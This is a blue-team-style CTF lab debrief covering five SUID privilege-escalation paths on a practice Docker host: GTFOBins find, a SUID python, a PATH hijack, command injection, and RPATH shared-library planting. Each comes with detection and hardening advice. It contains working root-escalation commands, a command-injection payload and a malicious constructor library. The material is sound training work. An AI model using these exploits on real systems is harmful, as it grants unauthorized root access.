# Chapter 01 — Debrief / Full Writeup

> Spoilers ahead. This is the blue-team-grade debrief: every path to root on
> `hollow-fileproc-01`, **why** it works, how a defender **detects** it, and how
> they **fix** it. Work the box from [README.md](README.md) first.

---

## Background: what SUID actually is

Every file has permission bits. The **SUID** bit (`chmod u+s`, shown as an `s`
in the owner's execute slot: `-rwsr-xr-x`) changes one thing: when you *execute*
the file, the process runs with the **effective UID of the file's owner**, not
yours. If root owns the file and the SUID bit is set, running it gives you a
process whose `euid` is `0`.

That's useful and legitimate — `passwd` needs it to edit `/etc/shadow`. It's also
a gift to an attacker whenever the SUID program can be *influenced* into doing
something it shouldn't: spawning a shell, running a command you control, or
loading code you wrote.

**Enumerate every SUID binary on a box:**

```bash
find / -perm -4000 -type f 2>/dev/null
```

On this host, the suspicious results are:

```
/usr/local/bin/suid-find      # Station A
/usr/local/bin/suid-python    # Station B
/usr/local/bin/logstats       # Station C
/usr/local/bin/logreader      # Station D
/usr/local/bin/report         # Station E
```

Each is a separate way to root. Let's take them in order.

---

## Station A — SUID on a known binary (`find`) · ★☆☆☆

### 1. Recon
```bash
ls -l /usr/local/bin/suid-find
# -rwsr-xr-x 1 root root ... /usr/local/bin/suid-find
file /usr/local/bin/suid-find      # it's just GNU find, renamed
```
A SUID binary owned by root whose name hints it's a copy of `find`.

### 2. The flaw
`find` has a `-exec` action that runs an arbitrary command. If `find` itself runs
as root (SUID), that command runs as root too. This is a textbook **GTFOBins**
entry — standard tools with a documented abuse when they're SUID/sudo.

### 3. Exploit
```bash
/usr/local/bin/suid-find . -exec /bin/sh -p \; -quit
# then:
id            # uid=1001(labuser1) euid=0(root)
cat /root/flag.txt
```

### 4. Why it works
`find` spawns `/bin/sh` via `-exec` while its effective UID is 0. The `-p` flag
tells the shell **not** to drop privileges back to the real UID (shells normally
reset `euid`→`ruid` on startup unless told otherwise). Result: a root shell.
`-quit` just stops `find` after the first match so you don't spawn many shells.

### 5. Detect
```bash
# Inventory SUID binaries and diff against a known-good baseline
find / -perm -4000 -type f 2>/dev/null | sort > /tmp/suid.now
# Anything under /usr/local/bin that duplicates a system tool is a red flag.
```
With auditd, watch for execution of unexpected SUID paths and `setuid` syscalls
from non-system binaries.

### 6. Harden
- Remove the SUID bit: `chmod u-s /usr/local/bin/suid-find` (or delete the copy).
- Never `chmod +s` a general-purpose tool like `find`, `vim`, `cp`, `tar`, `nmap`.
- Mount user-writable filesystems `nosuid` so planted SUID binaries there are inert.

### 7. Real world
This is the entire premise of **GTFOBins** (<https://gtfobins.github.io>). Admins
"temporarily" SUID a tool to work around a permissions problem and forget. OSCP
and most CTF privesc boxes include at least one of these.

---

## Station B — SUID on an interpreter (`python3`) · ★☆☆☆

### 1. Recon
```bash
ls -l /usr/local/bin/suid-python
# -rwsr-xr-x 1 root root ... -> a SUID copy of python3
```

### 2. The flaw
An **interpreter** runs whatever source you give it. A SUID interpreter therefore
runs *your* code with root's effective UID. You don't even need a script file —
just launch it and you're sitting in a root-privileged interpreter, ready to type.

### 3. Exploit

Think of it as two moves: **first open a Python shell that is already root, then
tell that shell to give you a root bash.**

**Step 1 — open the SUID interpreter.** Because the binary is SUID root, launching
it interactively drops you straight into a Python REPL whose *effective* UID is
already `0`. Prove it before doing anything else:

```bash
labuser1@hollow-fileproc-01:~$ /usr/local/bin/suid-python
Python 3.12.3 (main) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.getuid(), os.geteuid()      # real UID is still you; EFFECTIVE UID is root
(1001, 0)
```

That `0` is the whole game: the interpreter in front of you is **already running
with root's privileges** — you just need to cash that in.

**Step 2 — run the escalation script inside that root shell.** Still at the `>>>`
prompt, make the privilege permanent and drop to a shell:

```python
>>> os.setuid(0)                   # set real + effective + saved UID all to 0
>>> os.system("/bin/bash")         # spawn a full, clean root shell
```
```bash
root@hollow-fileproc-01:~# id
uid=0(root) gid=1001(labuser1) groups=1001(labuser1)
root@hollow-fileproc-01:~# cat /root/flag.txt
R2R{su1d_b1ts_are_forever_check_your_perms}
```

> **One-liner equivalent** — the exact same two moves folded into one command
> (handy for scripts, but less obvious to a learner):
> ```bash
> /usr/local/bin/suid-python -c 'import os; os.setuid(0); os.system("/bin/bash")'
> ```

### 4. Why it works
Launching the SUID interpreter already hands you a process whose **effective UID is
`0`** — that's why the Step 1 REPL is root-capable from its very first prompt, even
though your *real* UID is still `labuser1` (the `(1001, 0)` you printed).
`os.setuid(0)` in Step 2 then sets the **real**, effective and saved UIDs all to
`0` — permitted *precisely because* `euid` is already `0` — so there's no uid
mismatch left for a freshly-spawned shell to "helpfully" drop. The resulting
`/bin/bash` is a full, clean root shell.

### 5. Detect
Same SUID inventory as Station A. Additionally, a SUID interpreter is almost never
legitimate — flag any SUID `python*`, `perl`, `ruby`, `lua`, `node`, `bash` on
sight.

### 6. Harden
- `chmod u-s` / remove the copy.
- Interpreters should **never** be SUID. If a service needs elevated actions, give
  the *service* a tightly-scoped mechanism (a small SUID wrapper that does one
  thing, a `sudo` rule for one exact command, or a Linux capability), never a
  general interpreter.

### 7. Real world
GTFOBins lists `python`, `perl`, `ruby`, `php`, `lua`, `node` and more with exactly
this recipe. Any of them showing up SUID in an audit is an instant finding.

---

## Station C — PATH hijack of a custom SUID tool (`logstats`) · ★★☆☆

### 1. Recon
```bash
ls -l /usr/local/bin/logstats           # SUID root, custom binary
strings /usr/local/bin/logstats | grep -i du   # hints it runs 'du'
ltrace /usr/local/bin/logstats 2>&1 | grep system   # (if available) system("du ...")
```
Running it shows it reports disk usage — it calls `du` internally.

### 2. The flaw
`logstats` calls `system("du -sh /var/log ...")`. The command name **`du` is not an
absolute path**, so the shell resolves it through `$PATH`. You control `$PATH`, so
you control which `du` runs — as root.

### 3. Exploit
```bash
cd /tmp
printf '#!/bin/bash\n/bin/bash -p\n' > du      # our malicious 'du'
chmod +x du
export PATH=/tmp:$PATH                          # put /tmp first
/usr/local/bin/logstats                         # it finds OUR du first
id
cat /root/flag.txt
```

### 4. Why it works
`system()` runs `/bin/sh -c "du ..."`. The shell searches each directory in `$PATH`
left-to-right for `du` and runs the first match. Because `logstats` did
`setuid(0)` first, the whole process (and therefore our `du`) runs with `uid=0`.
The program trusted a bare command name in a privileged context — the classic
**PATH-injection** mistake.

### 5. Detect
- Static review: grep source/binaries for `system(`, `popen(`, `execlp`, `execvp`
  with **bare** command names.
- Runtime: a root process exec'ing a binary out of `/tmp` or a user-writable dir is
  highly suspicious — auditd `execve` rules catch it.

### 6. Harden
- Call external programs by **absolute path** (`/usr/bin/du`), or better, avoid the
  shell: `execve("/usr/bin/du", ...)` with a sanitized environment.
- Reset `PATH` to a known-good value inside privileged programs
  (`setenv("PATH","/usr/bin:/bin",1)` before any `system`/`exec*`).
- Don't shell out at all if a library call will do.

### 7. Real world
PATH hijacking of SUID/root helpers is everywhere — cron scripts, init scripts,
and vendor "agents" that call `service`, `gzip`, `ps`, etc. by bare name. Same root
cause as the cron chapter, just without the 60-second wait.

---

## Station D — command injection in a custom SUID tool (`logreader`) · ★★☆☆

### 1. Recon
```bash
ls -l /usr/local/bin/logreader
/usr/local/bin/logreader test           # "usage: logreader <logfile>" -> takes input
/usr/local/bin/logreader messages        # cats /var/log/messages -> it builds a path
```

### 2. The flaw
`logreader` builds a shell command by pasting your argument straight into a string:
`/bin/cat /var/log/<your input>`, then hands it to `system()`. No sanitising — so
shell metacharacters in "your input" become commands.

### 3. Exploit
```bash
/usr/local/bin/logreader 'x; /bin/bash'
# the command becomes:  /bin/cat /var/log/x ; /bin/bash
id
cat /root/flag.txt
```
(`$(...)`, backticks, or `| bash` work just as well.)

### 4. Why it works
`system("/bin/cat /var/log/" + argv[1])` with `argv[1] = "x; /bin/bash"` yields two
commands separated by `;`. The first fails harmlessly (`/var/log/x` doesn't exist);
the second — your shell — runs with the process's root `euid`. **Untrusted input +
a shell = command injection**, and here the shell is root's.

### 5. Detect
- Static review: any `system`/`popen`/`exec` where user input is concatenated into
  the command string. SAST tools (Semgrep rule `dangerous-system-call`) flag it.
- Runtime: auditd on `execve` from the SUID binary showing unexpected child commands.

### 6. Harden
- Never build shell strings from input. Use `execve` with an argument **vector** so
  arguments can't be reinterpreted as commands.
- If you must name a file, validate it against an allow-list / strip path separators
  and metacharacters, and use `openat`/`O_NOFOLLOW` rather than shelling out to `cat`.
- Drop privileges as early as possible — the tool never needed persistent root.

### 7. Real world
CWE-78 (OS Command Injection) is a perennial OWASP/top-CWE entry. In SUID helpers
and web backends alike, it's one of the highest-impact, easiest-to-make bugs.

---

## Station E — shared-object injection via a writable RPATH dir (`report`) · ★★★☆

### 1. Recon
```bash
ls -l /usr/local/bin/report                 # SUID root, custom binary
ldd /usr/local/bin/report                   # depends on libgreet.so
objdump -x /usr/local/bin/report | grep -iE 'rpath|runpath'
#   -> RPATH/RUNPATH = /opt/lab/lib
ls -ld /opt/lab/lib                          # drwxrwxrwx  <-- world-writable!
```

### 2. The flaw
`report` loads `libgreet.so` at runtime. The loader finds it via the **RPATH baked
into the binary**, which points at `/opt/lab/lib` — and that directory is
**world-writable** (`0777`). You can replace the library the root process loads.

### 3. Exploit
```bash
cat > /tmp/evil.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
/* runs the instant the library is loaded, before main gets going */
__attribute__((constructor))
void pwn(void) {
    setuid(0); setgid(0);
    system("/bin/bash");
}
void greet(void) {}   /* stub: keep the symbol so 'report' still links/loads */
EOF

rm -f /opt/lab/lib/libgreet.so                            # dir is writable (non-sticky)
gcc -shared -fPIC -o /opt/lab/lib/libgreet.so /tmp/evil.c
/usr/local/bin/report                                     # loads OUR libgreet.so as root
id
cat /root/flag.txt
```

### 4. Why it works
Two ideas combine:

1. **The loader honors RPATH even for SUID binaries.** `LD_PRELOAD` and
   `LD_LIBRARY_PATH` from the environment are *ignored* when a program runs in
   secure-execution mode (`AT_SECURE=1`, which SUID triggers) — that's why the naive
   `LD_PRELOAD` trick fails here. But `DT_RPATH`/`DT_RUNPATH` are compiled **into**
   the trusted binary, so the loader still searches them. A writable RPATH dir is
   therefore a real, trusted-but-attacker-controlled search path.
2. **A shared library can run code on load** via a `constructor` function — it
   executes as soon as `report` maps the library, while `euid=0`.

Note the permissions subtlety: `/opt/lab/lib` is `0777` and **not sticky**, so you
can `rm` root's `libgreet.so` even though you don't own it (deleting a file needs
write+execute on the *directory*, not the file) and drop your own in its place.

### 5. Detect
- Audit SUID binaries for writable `RPATH`/`RUNPATH` dirs:
  ```bash
  for b in $(find / -perm -4000 -type f 2>/dev/null); do
    for d in $(objdump -x "$b" 2>/dev/null | awk '/RUNPATH|RPATH/{print $2}'); do
      [ -w "$d" ] && echo "WRITABLE RPATH: $b -> $d"
    done
  done
  ```
- Flag world-writable directories generally: `find / -type d -perm -0002 2>/dev/null`.
- Runtime: auditd watch (`-w /opt/lab/lib -p wa`) catches writes to the library dir.

### 6. Harden
- Never put a writable directory on a privileged binary's library path. Keep
  `RPATH`/`RUNPATH` pointing only at root-owned dirs (`chmod 755`, `chown root`).
- Prefer no custom RPATH at all; install libraries to standard, root-owned paths.
- Mount user-writable filesystems `nosuid`; keep `/opt/lab/lib` out of any SUID
  binary's search path.

### 7. Real world
Writable `RPATH`/`RUNPATH` and insecure library search paths are a recognized class
(CWE-426 Untrusted Search Path, CWE-427 Uncontrolled Search Path Element). Real
cases include setuid vendor tools shipping an `$ORIGIN`/writable RPATH, and the
broader family of "DLL/`.so` planting" bugs. It's the native-library cousin of the
PATH hijack in Station C.

---

## Scoreboard

| Station | Vector | Primitive | Difficulty |
|---------|--------|-----------|:----------:|
| A | SUID known binary (`find`) | GTFOBins `-exec` | ★☆☆☆ |
| B | SUID interpreter (`python3`) | `os.setuid(0)` + shell | ★☆☆☆ |
| C | SUID custom + bare command | PATH hijack | ★★☆☆ |
| D | SUID custom + user input | Command injection | ★★☆☆ |
| E | SUID custom + writable lib dir | `.so` injection via RPATH | ★★★☆ |

**The through-line:** a SUID root binary is root's code. You win whenever you can
influence *what that code does* — the program it runs (A, B), the command name it
resolves (C), the string it executes (D), or the library it loads (E). Secure SUID
programs do exactly one narrow thing, trust nothing from the caller's environment,
and drop privileges the moment they can.

---

## Clean up / reset

```bash
# from the repo root on your host
docker compose up -d --build --force-recreate target-suid
```
Rebuilds the box back to pristine-vulnerable (fresh flag, all five stations armed).
